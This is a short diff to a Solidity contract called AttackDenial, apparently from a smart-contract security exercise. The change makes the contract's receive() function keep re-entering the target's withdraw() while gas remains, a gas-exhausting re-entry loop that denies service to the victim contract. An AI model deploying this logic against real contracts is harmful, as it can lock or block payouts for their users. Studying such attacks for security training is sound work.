@@ -12,7 +12,7 @@ contract AttackDenial {
 
     receive() payable external {
         console.log(denialContract.contractBalance());
-        if (denialContract.contractBalance() > 100) {
+        if (gasleft() > 5) {
             denialContract.withdraw();
         }
     }
